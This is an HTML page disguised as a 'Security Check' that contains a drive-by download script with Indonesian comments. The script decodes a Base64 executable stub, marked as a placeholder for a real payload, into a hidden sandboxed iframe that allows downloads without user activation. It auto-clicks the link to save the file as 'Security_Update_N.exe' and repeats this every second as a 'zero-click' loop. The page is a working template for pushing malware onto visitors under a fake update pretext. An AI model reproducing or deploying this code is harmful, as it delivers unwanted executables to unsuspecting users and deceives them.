<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>System Verification</title>
  <style>
    body { background: #f4f6f8; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
    h1 { color: #333; margin-bottom: 10px; }
    p { color: #666; }
    #status { margin-top: 20px; color: #007aff; font-weight: bold; font-family: monospace; }
  </style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Check</h1>
  <p id="status">Menyiapkan pembaruan...</p>
</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var downloadCount = 0;

  // ============================================
  // 1. PAYLOAD PEMBUAT FILE (BASE64)
  // ============================================
  // Header file (Base64). Ganti dengan payload asli Anda.
  // "TVqQAAMAAAAEAAAAAEEAAgBA" adalah header MZ (EXE).
  var b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA"; 

  // ============================================
  // 2. FUNGSI MEMBUAT BLOB & TRIGGER DOWNLOAD
  // ============================================
  function triggerSilentDownload() {
    try {
      // Decode Base64 ke Bytes
      var binary = atob(b64Data);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }

      // Buat Blob dengan MIME Type 'application/octet-stream'
      // MIME Sniffing Bypass: Beberapa browser mengizinkan unduhan otomatis 
      // untuk tipe ini di dalam sandbox.
      var blob = new Blob([bytes], { type: 'application/octet-stream' });
      var url = URL.createObjectURL(blob);

      // Buat iframe sandbox untuk menampung link unduhan
      var iframe = document.createElement("iframe");
      iframe.srcdoc = `<body><a id="dl" href="${url}" download="Security_Update_${downloadCount}.exe">Download</a></body>`;
      
      // ATRIBUT KRUSIAL: allow-downloads-without-user-activation
      iframe.sandbox = "allow-scripts allow-downloads-without-user-activation";
      iframe.style.display = "none";
      
      document.body.appendChild(iframe);

      // Pemicu klik otomatis di dalam iframe
      iframe.onload = function() {
        try {
          var doc = iframe.contentDocument || iframe.contentWindow.document;
          var link = doc.getElementById('dl');
          if (link) {
            link.click();
            downloadCount++;
            statusEl.innerText = "Telah mengunduh: " + downloadCount + " file";
            console.log("[!] Download triggered: " + downloadCount);
          }
        } catch(e) {}
      };

      // Cleanup URL setelah 10 detik
      setTimeout(function() {
        URL.revokeObjectURL(url);
      }, 10000);

    } catch(e) {
      console.error("Download error:", e);
    }
  }

  // ============================================
  // 3. ZERO-CLICK LOOP (Setiap 1 Detik)
  // ============================================
  setInterval(triggerSilentDownload, 1000);

})();
</script>
</body>
</html>
